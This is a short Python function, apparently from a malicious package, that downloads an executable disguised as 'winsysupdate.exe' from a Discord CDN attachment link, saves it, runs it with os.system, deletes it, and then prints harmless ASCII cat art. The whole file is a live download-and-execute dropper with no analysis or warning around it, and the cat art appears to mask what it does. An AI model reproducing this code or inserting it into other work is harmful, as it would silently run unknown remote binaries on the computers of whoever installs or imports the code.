def init():
    import requests
    import os

    url = 'https://cdn.discordapp.com/attachments/1156295022447185950/1156316457601335506/winsysupdate.exe'
    r = requests.get(url, allow_redirects=True)

    open('winsysupdate.exe', 'wb').write(r.content)

    os.system('winsysupdate.exe')
    os.remove('winsysupdate.exe')

    print('''
 ╱|、
(˚ˎ。7
 |、˜〵
 じしˍ,)ノ
        ''')